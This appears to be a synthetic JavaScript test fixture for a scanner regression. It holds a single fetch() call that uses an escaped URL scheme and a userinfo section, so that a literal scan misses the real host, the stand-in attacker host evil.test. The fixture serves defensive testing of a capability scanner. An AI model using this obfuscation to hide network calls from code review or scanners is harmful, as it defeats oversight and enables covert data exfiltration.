// DEFANGED RECONSTRUCTION for the userinfo-escaped-scheme regression.
// Synthetic, not a historical artifact. Parsed by capdelta tests only; never
// imported, installed, or executed.
// Kept: a fetch whose escaped scheme hides a.test from the literal scan, and
// whose userinfo stops the scan before evil.test. The cooked value holds both.
// Omitted: every network call; the hosts are reserved .example.test names.
module.exports = function run() {
  return fetch("h\u0074tps://a.test b@evil.test/x");
};
